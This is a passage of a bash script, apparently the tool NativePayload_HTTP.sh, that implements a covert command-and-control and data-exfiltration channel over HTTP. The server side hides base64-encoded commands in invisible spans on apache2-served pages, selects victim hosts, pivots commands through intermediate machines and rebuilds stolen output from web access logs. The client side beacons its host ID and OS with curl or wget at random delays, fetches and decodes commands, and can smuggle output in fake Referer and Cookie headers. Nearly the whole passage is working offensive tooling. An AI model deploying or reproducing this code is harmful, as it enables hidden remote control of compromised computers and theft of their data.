	Remove_logs;	
	echo "" > IPv4Clients.txt
	echo "" > clientsinfo.txt
	isRandom="false"	
	input="AAAA"
	inputArray=()
	
	FakeHeaders="off"
	TargetHost=""
	Clientdelay=""
	HinjectionoffReferer="false"
	HinjectionoffCookies="false"
	CommandPivMode="false"
	PivCMD=""
	PivClient=""
	ServerIPv4=""
	v1=""  # TargetHost
	v2=""  # Time
	v3="xheader-off"  # FakeHeaderStatus [xheader-on]::[xheader-off]
	v4=""  # Cmd
	v5=",0" # Base64Status off[0]::on[1]
	v6="0"  # ServerDelay
	v7=",0" # FakeHeaderMode Referer[1]::Cookies[2]
	v8=""  # PivCMD
	v9=""  # PivClient

	CmdNumber=0
	Time=`date '+%d-%m-%Y.%H-%M-%S'`
	#InjectCMDtoHTML "[[$Timestr]]" "cmd:init"
	InjectCMDtoHTML "" "[[$Timestr]]" "$v3" "cmd:init" "" "0" "" "" ""
	echo "[>]:Service.apache2:Stoped"
	initApache2ConfigFile;	
	echo "[>]:Server.Exfiltration.Mode:Started"
	echo "[>]:Server.Defaultpage.[/var/www/html/default.aspx]:Created"
	echo "[>]:Server.Commandpage.[/var/www/html/getcmd.aspx]:Created"
	echo "[>]:Server.Monitoring.log[/var/log/apache2/access.log]:Started"

	
	sleep 1
	myPid=`echo $$`
	ClientsDetection "$myPid" &

	while [ "$input" != "@exit" ] 
	do 
			
		while true ; 
		do

		tput setaf 2
		if [ "$CommandPivMode" == "true" ]; 
		then
		CommandPivMode="false"	
		break
		else
		nothing="nothing"
		CommandPivMode="false"	
		fi
		if [ "$TargetHost" == "" ] ;
		then
		read -p "$(tput setaf 2)[>]:Enter::Commands.input:#$(tput setaf 11)" input
		tput setaf 2
		else
		if [[ "$FakeHeaders" == "true" ||  "$HinjectionoffCookies" == "true" || "$HinjectionoffReferer" == "true" || "$isRandom" == "true" ]];
		then
			TempStatus="["$TargetHost"][";
			if [ "$FakeHeaders" == "true" ]
			then
			TempStatus+="F"
			fi
			if [ "$HinjectionoffCookies" == "true" ]
			then
			TempStatus+=".Co"
			fi
			if [ "$HinjectionoffReferer" == "true" ]
			then
			TempStatus+=".Re"
			fi
			if [ "$isRandom" == "true" ]
			then
				if [ "$FakeHeaders" == "true" ]
				then
				TempStatus+=".B64"
				else
				TempStatus+="B64"
				fi
			fi
		read -p "$(tput setaf 2)[>]:Enter::Commands.input.$(tput setaf 3)$TempStatus]$(tput setaf 2):#$(tput setaf 11)" input
		else
		TempStatus="["$TargetHost"]";
		read -p "$(tput setaf 2)[>]:Enter::Commands.input.$(tput setaf 3)$TempStatus$(tput setaf 2):#$(tput setaf 11)" input
		fi

		tput setaf 2
		fi
		if [[ $input == "@exit" ]]
			then
			pids=`ps -ef | grep "python -m SimpleHTTPServer" | awk {'print $2'}`
			for i in $pids ; 
			do		
			nohup kill $pids > pidskill.txt  2>&1 &
			done
			`service apache2 stop`
			echo "[>]:Service.apache2:Stoped"
			exit ;
			elif [[ "$input" == "@interact "* || "$input" == "@ "* ]] ;
			then
			tput setaf 10
			select=`echo $input | cut -d' ' -f2`
				istrueselected="false"
				for index in `cat IPv4Clients.txt | awk {'print $2'}`
				do				
				if [[ `echo $index | cut -d':' -f2 ` == $select ]] ; 
				then
				echo "[@]:Target Host: $select"				
				istrueselected="true"
					if [ "$TargetHost" != "$select" ] ;
					then
					v6="0"
					Clientdelay=""
					fi
				TargetHost=$select				
				break;
				fi
				done	
			if [ $istrueselected == "false" ] ; 
			then
			echo "[@]:Target Host is not Detected !"				
			fi
			tput setaf 2
		elif [[ "$input" == "@back" ]] ;
			then
			TargetHost=""
			tput setaf 2
		elif [[ "$input" == "@delay "* ]] ;
			then
				if [ "$TargetHost" != "" ] ; 
				then
				tempserverdelay=`echo $input | cut -d' ' -f2`
					if [[ "$tempserverdelay" != "off" && `echo "$tempserverdelay" | tr -dc 0-9` ]] 
					then
					Clientdelay=`echo $input | cut -d' ' -f2`
					tput setaf 10
					echo "[@]:System.IPv4.[$TargetHost].Checking.ServerbyDelay.[$Clientdelay]:On"
					Time=`date '+%d-%m-%Y.%H-%M-%S'`
					echo "[$Time] .... System.IPv4.[$TargetHost].Checking.ServerbyDelay.[$Clientdelay]:On" >> clientsinfo.txt
					else
					Clientdelay="Off"
					sed -i "/$TargetHost/d" clientsinfo.txt
					tput setaf 10
					echo "[@]:System.IPv4.[$TargetHost].Checking.ServerbyDelay:Off"
					Time=`date '+%d-%m-%Y.%H-%M-%S'`
					echo "[$Time] .... System.IPv4.[$TargetHost].Checking.ServerbyDelay.[$Clientdelay]:Off" >> clientsinfo.txt
					fi
				fi
			tput setaf 2 
		elif [[ "$input" == "@help" ]] ;
			then
			tput setaf 11
			_help
			tput setaf 2
		elif [[ "$input" == "@xrefon" || "$input" == "@xrn"  ]] ;
			then
			tput setaf 10
				if [ "$FakeHeaders" == "true" ]
				then				
				echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.header.payload.injection.[Referer]:On"
				HinjectionoffReferer="true"
				HinjectionoffCookies="false"
				else
				echo "[!]:Fakeheader is off , Please use command \"@fhn\" before this command!"
				echo "[!]:HTTP::Curl.Web.Request.fakeheader:is Off"
				HinjectionoffReferer="false"
				fi
			tput setaf 2
		elif [[ "$input" == "@xrefoff" || "$input" == "@xrf"  ]] ;
			then
			tput setaf 10
			echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.header.payload.injection.[Referer]:Off"
			HinjectionoffReferer="false"			
			tput setaf 2
		elif [[ "$input" == "@xcookieon" || "$input" == "@xcn"  ]] ;
			then
			tput setaf 10
				if [ "$FakeHeaders" == "true" ]
				then				
				echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.header.payload.injection.[Cookies]:On"
				HinjectionoffCookies="true"
				HinjectionoffReferer="false"
				else
				echo "[!]:Fakeheader is off , Please use command \"@fhn\" before this command!"
				echo "[!]:HTTP::Curl.Web.Request.fakeheader:is Off"
				HinjectionoffCookies="false"
				fi
			#echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.header.payload.injection.[Cookies]:On"
			#HinjectionoffCookies="true"
			#HinjectionoffReferer="false"
		elif [[ "$input" == "@xcookieoff" || "$input" == "@xcf"  ]] ;
			then
			tput setaf 10
			echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.header.payload.injection.[cookies]:Off"
			HinjectionoffCookies="false"
			tput setaf 2
		elif [[ "$input" == "exit" ]] ;
			then
				if [ "$TargetHost" != "" ] ; 
				then
				tput setaf 10
				echo "[>]:System.IPv4.[$TargetHost]:Exit"
				tput setaf 2
				break;
				fi
			tput setaf 2
		elif [[ "$input" == "@version" ]] ;
			then
			tput setaf 10
			echo "[@]:Script.[NativePayload_HTTP.sh].version:1.4"
			tput setaf 2
		elif [[ "$input" == "@info" ]] ;
			then
			tput setaf 10
			echo "[@]:Server.Configuration.Info:Show"
			echo
					if [ "$HinjectionoffCookies" == "true" ] 
					then
					echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.header.payload.injection.[Cookies]:is On (apply to all clients)"
					fi
					if [ "$HinjectionoffReferer" == "true" ]
					then
					echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.header.payload.injection.[Referer]:is On (apply to all clients)"
					fi
				if [ "$TargetHost" == "" ] ;
				then
					if [ "$FakeHeaders" == "true" ];
					then 
					echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.fakeheader:is On (apply to all clients)"
					fi
					if [ "$isRandom" == "true" ];
					then
					echo "[@]:HTTP::DumpedbyHttp::Payload.Request.base64:is On (apply to all clients)"
					fi
					echo "[!]:Clients.Delay.history:Show"
					cat clientsinfo.txt
				else
					if [ "$FakeHeaders" == "true" ];
					then 
					echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.fakeheader:is On (apply to all clients)"					
					fi
					if [ "$isRandom" == "true" ];
					then
					echo "[@]:HTTP::DumpedbyHttp::Payload.Request.base64:is On (apply to all clients)"
					fi
					echo "[!]:Client.[$TargetHost].Delay.history:Show"
					cat clientsinfo.txt | grep $TargetHost
					echo
				fi
					

			echo
			tput setaf 2
		elif [[ "$input" == "@fheaderon" || "$input" == "@fhn" ]] ;
			then
			tput setaf 10
			echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.fakeheader:On"
			FakeHeaders="true"
			tput setaf 2
		elif [[ "$input" == "@fheaderoff" || "$input" == "@fhf" ]] ;
			then
			tput setaf 10
			echo "[@]:HTTP::DumpedbyHttp::Curl.Web.Request.fakeheader:Off"
			FakeHeaders="false"
			v3="xheader-off"
			HinjectionoffCookies="false"
			HinjectionoffReferer="false"
			tput setaf 2
		elif [[ "$input" == "@base64off" || "$input" == "@64off" ]]  
			then
			tput setaf 10
			echo "[@]:HTTP::DumpedbyHttp::Payload.Request.base64:Off"
			isRandom="false"
			tput setaf 2
			elif [[ "$input" == "@clients" || "$input" == "@cli" ]] ;
			then
			tput setaf 10
			echo "[@]:Clients.list:Show"						
			strings "IPv4Clients.txt" | awk '!a[$1]++'
			echo
			tput setaf 2
		elif [[ "$input" == "poweroff" ]] 
			then
				if [ "$TargetHost" != "" ] ; 
				then
				tput setaf 10
				echo "[>]:System.IPv4.[$TargetHost]:Poweroff"	
				tput setaf 2
				break;
				fi
		elif [[ "$input" == "@base64on" || "$input" == "@64on" ]] 
			then
			tput setaf 10
			echo "[@]:HTTP::DumpedbyHttp::Payload.Request.base64:On"
			isRandom="true"
			tput setaf 2
		elif [[ "$input" == "@cmdsave" ]] 
			then
			Time=`date '+%d-%m-%Y.%H-%M-%S'`
			for index in ${!inputArray[*]}
			do
			echo "$index ${inputArray[$index]}" >> Commands-list_$Time.txt
			done
			Time=`date '+%d-%m-%Y.%H-%M-%S'`
			tput setaf 10
			echo "[@]:Commands.Saved:[Commands-list_$Time.txt]"			
			tput setaf 2
		elif [[ "$input" == "@cmdlist" ]] 
			then
			tput setaf 10
			echo "[@]:Commands.list:Show"
			echo "[@]:N.Normal:bytes::B64.Base64:bytes"
			echo "[@]:Re.Header.Injection.via.[Referer]"
			echo "[@]:Co.Header.Injection.via.[Cookies]"
			#echo "$(tput setab 4)"
			echo
			tput setaf 11
			for index in ${!inputArray[*]}
			do
			echo "$index ${inputArray[$index]}" 
			echo "__________________________________"
			done			
			echo
			tput setaf 2
		elif [[ "$input" == "@piv" ]] 
			then
				if [ "$TargetHost" != "" ] ;
				then
				while true ;
				do
					v8=""  # PivCMD
					v9=""  # PivClient									
				read -p "$(tput setaf 2)[>]:Enter::Commands.input.$(tput setaf 3)[$TargetHost][Pivoting.Client.IPv4]$(tput setaf 2):#$(tput setaf 11)" PivClient				
				if [ "$PivClient" != "" ] ; 
				then
					if [[ "$PivClient" =~ ^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$ ]] ;
					then
					ServerIPv4=`hostname -I`
					if [[ "$PivClient" != "$ServerIPv4" && "$PivClient" != "$TargetHost" ]] ;
					then
						tput setaf 10
						echo "[@]:Pivoting.Client.IPv4.[$PivClient]:Configured"
						echo "[@]:Pivoting.info::Server.[$ServerIPv4] <<-- Intermediate.[$TargetHost] <<-->> Client.[$PivClient]:Configured"
						tput setaf 2
						while true ;
						do								
						read -p "$(tput setaf 2)[>]:Enter::Commands.input.$(tput setaf 3)[$TargetHost][Pivoting.Client.Command]$(tput setaf 2):#$(tput setaf 11)" PivCMD
						if [ "$PivCMD" != "" ];
						then
							if [ "$PivCMD" == "@back" ];
							then
							CommandPivMode="false"	
							break;
							else
							tput setaf 10
							echo "[@]:Pivoting.info::Server.[$ServerIPv4] <<-- Intermediate.[$TargetHost] <<-->> Client.[$PivClient].Command.[$PivCMD]:Executing"					
							tput setaf 2
							CommandPivMode="true"					
							v8=`echo "$PivCMD" | base64`  # PivCMD
							v9="$PivClient"  # PivClient
							break;
							fi
						fi
						done
															
						break;
					fi
					elif [[ "$PivClient" == "@back" ]]
					then
					CommandPivMode="false"	
					break;
					else
					tput setaf 10
					echo "[@]:Pivoting.Client.IPv4:Invalid"	
					tput setaf 2
					fi					
				fi
				done
				fi
		elif [[ $input != '' ]]
			then
			if [ "$TargetHost" != "" ] ;
			then
				if [[ $input != "@"* ]] ;
				then
				break;
				fi
			fi
			if [ "$TargetHost" == "" ] ;
			then
			echo "[!]:Please use \"@interact:192.168.1.x\" to Select Target Host by IPv4"
			echo "[!]:Example: [>]:Enter::Commands.input:#@interact:192.168.56.101"
			echo "[!]:by \"@clients\" you can see list of IPv4-Clients"
			echo
			fi
			else 
			Again="Again;)"
			fi
		done

	Remove_logs;

	Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
	v1="$TargetHost"    # TargetHost
	v2="[[$Timestr]]" # Time
	v3="xheader-off"  # FakeHeaderStatus [xheader-on]::[xheader-off]
	v4="$input"       # Cmd
	v5=",0" # Base64Status off[0]::on[1]
	v6="0"  # ServerDelay
	v7=",0" # FakeHeaderMode Referer[1]::Cookies[2]


	sleep 0.1
	Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
			if [ "$FakeHeaders" == "true" ] ;
			then
			echo "[!]:[$Timestr]:[F]:your client will send cmd.output by Curl /GET Http.FakeHeader"
			v3="xheader-on"
			
					# checking Payload injection to header [Referer,Cookies][on] and injecting command to html 
				if [ "$HinjectionoffCookies" == "true" ] ;
				then			
				echo "[!]:[$Timestr]:[Co]:your client will send cmd.output by Curl /GET Http.FakeHeader.via.[Cookies]"
				v7=",2"
				fi
				if [ "$HinjectionoffReferer" == "true" ] ;
				then
				echo "[!]:[$Timestr]:[Re]:your client will send cmd.output by Curl /GET Http.FakeHeader.via.[Referer]"
				v7=",1"
				fi
			fi
			if [ "$isRandom" == "true" ] ;
			then
			echo "[!]:[$Timestr]:[B64]:your client will send cmd.output by Base64 (bytes)"
			v5=",1"
			fi

	Timestr=`date '+%d-%m-%Y.%H-%M-%S'`

	# checking delay and injecting command to html 
	delayhistory=`cat clientsinfo.txt | grep "$TargetHost" | grep "Checking.ServerbyDelay" | grep "On" | cut -d'[' -f4 | cut -d']' -f1 | tail -1`
	if [ "$Clientdelay" == "" ];
	then
	#v6="$Clientdelay"
		if [ "$delayhistory" != "" ];
		then 			
		v6="$delayhistory"
		else
		v6="0"
		fi
	fi
	if  [[ "$Clientdelay" != "" && "$Clientdelay" != "Off" ]] ;
	then
	v6="$delayhistory"
	fi
	if  [ "$Clientdelay" == "Off" ]
	then
	v6="0"
	fi

	# checking Payload injection to header [Referer,Cookies][off] and injecting command to html 
	if [[ "$HinjectionoffCookies" == "false" && "$HinjectionoffReferer" == "false" ]];
	then
	v7=",0"
	fi
 	# $HinjectionoffCookies $HinjectionoffReferer $FakeHeaders
	##############################################################################
	InjectCMDtoHTML "$v1" "$v2" "$v3" "$v4" "$v5" "$v6" "$v7" "$v8" "$v9"
	##############################################################################
	
	if [[ "$input" == "poweroff" || "$input" == "exit" ]] ; 
	then
	# Removing HostID from List.... (poweroff , exit)
	Remove_Sessions_logs;
	sed -i "/$TargetHost/d" IPv4Clients.txt
	TargetHost=""
	fi

	tput setaf 10;
	Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
	echo "[>]:[$Timestr]:Exfiltration listening Mode Started by apache2 Service!"  
	filename="/var/log/apache2/access.log"
	myrecords=""
	FirsttimeMsg="true"
	while true; do
		tput setaf 2;	
		
		sleep 5
		fs2=$(stat -c%s "$filename")
		if [ "$fs" != "$fs2" ] ; 
		then
		
		tput setaf 6;
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		if [ "$FirsttimeMsg" == "true" ]
		then
		echo "[!]:[$Timestr]:Webserver log File has changed!" 		
		echo "[!]:[$Timestr]:Checking Http Queries"
		else
		printf '.'
		fi
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")

		BadRequest=""
		FinishFlag_windows=""
		FinishFlag=""

 		BadRequest=`strings $filename | grep "$TargetHost" | grep "GET" | grep "default.aspx?badrequest=null"`
		### bug here fixed ;) ###
		#FinishFlag=`strings $filename | grep "$TargetHost" | grep "GET" | awk {'print $7'} | cut -d'=' -f2 | grep "null"`
		FinishFlag=`strings $filename | grep "$TargetHost" | grep "GET" | awk {'print $7'} | grep "default.aspx?logoff=null"`

		# Detecting for header injection via Referer Mode
		if [ "$HinjectionoffReferer" == "true" ];
		then
		FinishFlag=`strings $filename | grep "$TargetHost" | grep "GET" | grep "null" | cut -d'=' -f3 | cut -d'&' -f1`
		FinishFlag_windows=`strings $filename | grep "$TargetHost" | grep "GET" | grep "default.aspx?logoff=null"`
		BadRequest=`strings $filename | grep "$TargetHost" | grep "GET" | grep "badrequest=null"`
		fi
		
		# Detecting for header injection via Cookie Mode
		if [ "$HinjectionoffCookies" == "true" ];
		then
		FinishFlag=`strings $filename | grep "$TargetHost" | grep "GET" | grep "null" | cut -d'=' -f4 | cut -d'&' -f1`
		FinishFlag_windows=`strings $filename | grep "$TargetHost" | grep "GET" | grep "default.aspx?logoff=null"`
		BadRequest=`strings $filename | grep "$TargetHost" | grep "GET" | grep "badrequest=null"`
		fi

		if (( `echo ${#FinishFlag_windows}` !=0 ))
		then
		echo
		InjectRefreshedHtml "$v3"
		break
		fi

		if (( `echo ${#FinishFlag}` !=0 ))
		then
		echo
		InjectRefreshedHtml "$v3"
		break
		fi

		if (( `echo ${#BadRequest}` !=0 ))
		then
		echo
		InjectRefreshedHtml "$v3"
		echo "[!]:CMD::DumpedbyHttp::ServerSide.error[bad.request]:Detected"
		break
		fi
		
		tput setaf 2;
		FirsttimeMsg="false"
		else
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
		FirsttimeMsg="true"
		fi
	done
	
	Records=`strings $filename | grep "$TargetHost" | grep "GET" | grep ".aspx?uids=" | awk {'print $7'} | cut -d'=' -f2`
	
	# detecting payload in header via [Referer:]
	if [ "$HinjectionoffReferer" == "true" ];
	then
	Records=`strings $filename | grep "$TargetHost" | grep "uids" | cut -d'=' -f3 | cut -d'&' -f1`
	fi

	# detecting payload in header via [Cookie:]
	if [ "$HinjectionoffCookies" == "true" ];
	then
	Records=`strings $filename | grep "$TargetHost" | grep "uids" | cut -d'=' -f4 | cut -d'&' -f1`
	fi

	  	
			for ops1 in `echo $Records`; 
			do
			if [[ $"$ops1" != $"null" ]]
			then
			myrecords+=`echo $ops1 | rev`
			fi
			done

	DumpedHTTP=""

	if [ "$isRandom" == "true" ] ; 
	then
	DumpedHTTP=`echo $myrecords | xxd -r -p | tr -d ' ' | base64 -d`	
	fi

	tput setaf 2;
	if [ "$isRandom" == "false" ] ; 
	then
	DumpedHTTP=`echo $myrecords | hex2raw -r | xxd -r -p | xxd -r -p`	
	fi
	echo $"$DumpedHTTP" > Dumped.bin &

	Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
	echo "[!]:[$Timestr]:Dumping this DATA/Text via http Queries"
	if [ "$3" == $'debug' ] ;
	then
	tput setaf 2;
	echo "[!]:HTTP.Debug::DumpedbyHttp::Payload.hex2raw:Show "
	tput setaf 10;
	echo $myrecords | hex2raw -r 
	tput setaf 2;
	echo "[!]:HTTP.Debug::DumpedbyHttp::Payload.bytes:Show "
	tput setaf 10;
	echo $myrecords | hex2raw -r | xxd -p -r
	
	tput setaf 2;
	echo "[!]:HTTP.Debug::DumpedbyHttp::Payload.strings:Show " 
	tput setaf 10;
	echo $DumpedHTTP 
	fi
		# Detecting Payload 
		tput setaf 2
		echo "[!]:CMD::DumpedbyHttp::Payload.strings.typeof:ShellCommands " 
		if [ "$input" == "@piv" ] ;
		then 
		tempv8=`echo $v8 | base64 -d`
		input="$input.commmand:$tempv8"
		fi
			if [ "$isRandom" == "false" ] ; 
			then
			echo "[!]:CMD::DumpedbyHttp::Payload.output:Show"
			Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
				if [ "$HinjectionoffReferer" == "true" ];
				then
				inputArray+=("$Timestr -N-F-Re-> Cmd:[$input]::$DumpedHTTP")
				elif [ "$HinjectionoffCookies" == "true" ];
				then
				inputArray+=("$Timestr -N-F-Co-> Cmd:[$input]::$DumpedHTTP")
				elif [ "$FakeHeaders" == "true" ]
				then
				inputArray+=("$Timestr ---N-F--> Cmd:[$input]::$DumpedHTTP")
				else
				inputArray+=("$Timestr ---N----> Cmd:[$input]::$DumpedHTTP")
				fi
			fi

			if [ "$isRandom" == "true" ] ; 
			then
			echo "[!]:CMD::DumpedbyHttp::Payload.Base64.output:Show"
			Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
				if [ "$HinjectionoffReferer" == "true" ];
				then
				inputArray+=("$Timestr -B64-F-Re-> Cmd:[$input]::$DumpedHTTP")
				elif [ "$HinjectionoffCookies" == "true" ];
				then
				inputArray+=("$Timestr -B64-F-Co-> Cmd:[$input]::$DumpedHTTP")
				elif [ "$FakeHeaders" == "true" ]
				then
				inputArray+=("$Timestr ---B64-F--> Cmd:[$input]::$DumpedHTTP")
				else
				inputArray+=("$Timestr ---B64----> Cmd:[$input]::$DumpedHTTP")
				fi
			fi
		echo
		tput setaf 11
		echo "${inputArray[$CmdNumber]}"
		tput setaf 2
		((CmdNumber++))
		echo

	sleep 0.2
	v8=""  # PivCMD
	v9=""  # PivClient
	done
	
	fi

# ============================================Exfiltration by HTTP traffic (DATA Receiving)===============

# ============================================Exfiltration by HTTP traffic (Executing Commands)===========
# ./NativePayload_HTTP.sh -dumpcmd  127.0.0.1 80 0.1 2 
if [ "$1" == $'-dumpcmd' ] ;
then

	
	CurlDetected=""
	# Detecting Curl and Wget
	#if [ `ls "/usr/bin/curl"` ] ;
	if  [ -x "$(command -v curl)" ];
	then
	CurlDetected="true"
	else
		#if [ `ls "/usr/bin/wget"` ] ; 
		if  [ -x "$(command -v wget)" ];
		then
		CurlDetected="false"
		echo "$(tput setaf 2)[!]:Warning:""$(tput setaf 10)[Client.curl]""$(tput setaf 2):Not Installed , Sending.Cmd.Output by \"wget\""
		else
		echo "$(tput setaf 2)[!]:Error:""$(tput setaf 10)[Client.curl]&[Client.wget]""$(tput setaf 2):Not Installed , you need one of them at least!"
		exit
		fi
	fi


if [ "$2" == "pivotclient" ] 
then
				pids=`ps -ef | grep "python -m SimpleHTTPServer 8080" | awk {'print $2'}`
				for i in $pids ; 
				do		
				nohup kill $pids > pidskill.txt  2>&1 &
				sleep 0.5
				done
echo "" > "IntermediateMSG.txt"			
sleep 1	
nohup python -m SimpleHTTPServer 8080 > "IntermediateMSG.txt" 2>&1 &
Client;
else
	Command2=""
	CMDTime1=""
	CMDTime2=""
	DetectSpecialPivotingCMDsTimer1=""
	DetectSpecialPivotingCMDsTimer2=""
	Xheaderison=""
	XServerDelay="0"
	XServerDelayTemp=""
	XServerDelayTempIPv4=""
	XServerHI=""
	Base64StatusTemp=""
	intermediate_init="false"
	if [ "$5" == "xheader" ] ;
	then
	Xheaderison="true"
	echo "[!]:Web.Request.[Curl.FakeHeader]:On"
	fi
	while true ; 
	do
	
	tput setaf 2	
	mydelayII=`head /dev/urandom | tr -dc 1-9 | head -c1`
	mydelayI=`head /dev/urandom | tr -dc 1-9 | head -c1`
	mydelay=`head /dev/urandom | tr -dc 10-45 | head -c2`
	Timestr=`date '+%d-%m-%Y.%H-%M-%S'`

	if [ "$XServerDelay" == "0" ] ;
	then
	Echo "[!]:CMD::Checking.Server.[$2]::SendbyHttp::Signal.Delay.Random:[$mydelay]:Started [$Timestr]"			
	else
	Echo "[!]:CMD::Checking.Server.[$2]::SendbyHttp::Signal.Delay.Random:[$XServerDelay]:Started [$Timestr]"			
	fi

	OS=`uname`
	OSv1=`printf '%s' " $OS " | base64 | xxd -p | rev`
	Hostid=`hostname -I | base64 | xxd -p | rev`
	HOSid=`echo $Hostid$OSv1`
	sleep 0.1
	
	# bug fixed here , i am sorry ;)		
	# Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?Session=$HOSid" "Sessions.log"	"$Xheaderison"	"$XServerHI" "$CurlDetected"	
	if  [ -x "$(command -v curl)" ];
	then
	nohup curl "http://$2:$3/default.aspx?Session=$HOSid" > "Sessions.log" 2>&1 &
	else
	wget "http://$2:$3/default.aspx?Session=$HOSid" -o "DumpedText_by_wget.txt" -O "Sessions.log"
	fi
	
	if [ "$XServerDelay" == "0" ] ;
	then
	sleep $mydelay
	else
	sleep $XServerDelay
	fi

	Curl "$LocalhostIPv4" "http://$2:$3/getcmd.aspx?logoff=command" "dumpcmds.log" "$Xheaderison" "$XServerHI" "$CurlDetected"		

	sleep 0.1

	#<span id="myTimeLabel2"  style="color:red; visibility:hidden" > 192.168.56.101 [[07-02-2019.08-25-34]] xheader-on dW5hbWUK,1 10 ,2   </span>
	#<span id="myTimeLabel_PivotServerCMD"  style="color:red; visibility:hidden" ></span>
	#<span id="myTimeLabel_PivotClient"  style="color:red; visibility:hidden" ></span>
	#<span id="myTimeLabel7"  style="color:red; visibility:hidden" > </span>
	#<span id="myTimeLabel_TargetHost"  style="color:red; visibility:hidden" >192.168.56.101</span>
	#<span id="myTimeLabel_Time"  style="color:red; visibility:hidden" >[[07-02-2019.08-25-34]]</span>
	#<span id="myTimeLabel_FakeheaderStatus"  style="color:red; visibility:hidden" >xheader-on</span>
	#<span id="myTimeLabel_CMD"  style="color:red; visibility:hidden" >dW5hbWUK</span>
	#<span id="myTimeLabel_Base64Status"  style="color:red; visibility:hidden" >,1</span>
	#<span id="myTimeLabel_Delay"  style="color:red; visibility:hidden" >10</span>
	#<span id="myTimeLabel_FakeHeaderMode"  style="color:red; visibility:hidden" >,2</span>
	#<span id="myTimeLabel8"  style="color:red; visibility:hidden" > </span>

	
	Command1=`strings dumpcmds.log | grep "myTimeLabel_CMD" | cut -d'>' -f2 | cut -d'<' -f1 | base64 -d`
	
	
	Base64Status=`strings dumpcmds.log | grep "myTimeLabel_Base64Status" | cut -d'>' -f2 | cut -d'<' -f1 | cut -d',' -f2`				

	DetectSpecialCMDs=`strings "dumpcmds.log" | grep "myTimeLabel_CMD" | cut -d'>' -f2 | cut -d'<' -f1 | base64 -d`

	DetectSpecialPivotingCMDs=`strings "dumpcmds.log" | grep "myTimeLabel_PivotServerCMD" | cut -d'>' -f2 | cut -d'<' -f1`
	DetectSpecialPivotingCMDsTimer1=`strings "dumpcmds.log" | grep "myTimeLabel_Time" | cut -d'>' -f2 | cut -d'<' -f1`
	
	DetectRefreshedPage=`strings "dumpcmds.log" | grep "myTimeLabelx" `
	DetectedRefreshedPage="false"

	
	if (( `echo ${#DetectRefreshedPage}` !=0 ))
	then
	DetectedRefreshedPage="true"	
	fi

	if [[ "$DetectSpecialCMDs" == "init" || "$DetectedRefreshedPage" == "true" ]] ;
	then
	Command1=$Command2;
	fi
	

	myHostid=`hostname -I`
	tmp=$myHostid
	myHostid=`echo $tmp | tr -dc 0-9.`
	HostIDisValid=`strings "dumpcmds.log" | grep "myTimeLabel_TargetHost" | cut -d'>' -f2 | cut -d'<' -f1`

 	if [ "$myHostid" == "$HostIDisValid" ] ;
	then
	CMDTime1=`strings "dumpcmds.log" | grep "myTimeLabel_Time" | cut -d'>' -f2 | cut -d'<' -f1`
	fi

	if [ "$5" != "xheader" ];
	then
	if [ "$myHostid" == "$HostIDisValid" ] ;
	then
	DetectingServerXheaderonoff=`strings "dumpcmds.log" | grep "myTimeLabel_FakeheaderStatus" | cut -d'>' -f2 | cut -d'<' -f1`	
		if [ "$DetectingServerXheaderonoff" == "xheader-on" ] ;
		then
		Xheaderison="true"		
		else	
		Xheaderison="false"
		fi
	fi
	fi


	DetectingServerDelay=`strings "dumpcmds.log" | grep "myTimeLabel_Delay" | cut -d'>' -f2 | cut -d'<' -f1`
	if [ "$myHostid" == "$HostIDisValid" ] ;
	then
		if (( `echo ${#DetectingServerDelay}` !=0 ))
		then
			XServerDelayTempIPv4=`echo $DetectingServerDelay | cut -d'|' -f1`
			
			if [ "$myHostid" == "$XServerDelayTempIPv4" ]
			then
			XServerDelayTemp=`echo $DetectingServerDelay | cut -d'|' -f2`	
			fi
			#XServerDelayTemp=$DetectingServerDelay
		fi
		if [[ `echo $XServerDelayTemp` == "0" ]] ;
		then
		XServerDelay="0"
		else
		XServerDelay=`echo $XServerDelayTemp`
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		if [ "$XServerDelay" != "" ] ;
		then
		echo "[!]:CMD::Server.Command.Checking.ServerbyDelay.[$XServerDelay]:Detected [$Timestr]"
		fi
		fi
	fi

		DetectingServerPayInjtoHeader=`strings "dumpcmds.log" | grep "myTimeLabel_FakeHeaderMode" | cut -d'>' -f2 | cut -d'<' -f1`
		if [ "$DetectingServerPayInjtoHeader" == ",1" ] ;
		then
		XServerHI="iReferer-on"
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
			if [[ $"$Command1" != $"$Command2" || $"$CMDTime1" != $"$CMDTime2" ]];
			then	
			echo "[!]:CMD::Server.Command.Curl.Header.Payload.Injection.[Referer]:$(tput setaf 3)Detected""$(tput setaf 2) [$Timestr]"		
			else
			echo "[!]:CMD::Server.Command.Curl.Header.Payload.Injection.[Referer]:Detected" "[$Timestr]"		
			fi
		fi
		if [ "$DetectingServerPayInjtoHeader" == ",2" ] ;
		then
		XServerHI="iCookie-on"
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
			if [[ $"$Command1" != $"$Command2" || $"$CMDTime1" != $"$CMDTime2" ]];
			then	
			echo "[!]:CMD::Server.Command.Curl.Header.Payload.Injection.[Cookie]:$(tput setaf 3)Detected""$(tput setaf 2) [$Timestr]"		
			else
			echo "[!]:CMD::Server.Command.Curl.Header.Payload.Injection.[Cookie]:Detected" "[$Timestr]"		
			fi
		fi
		
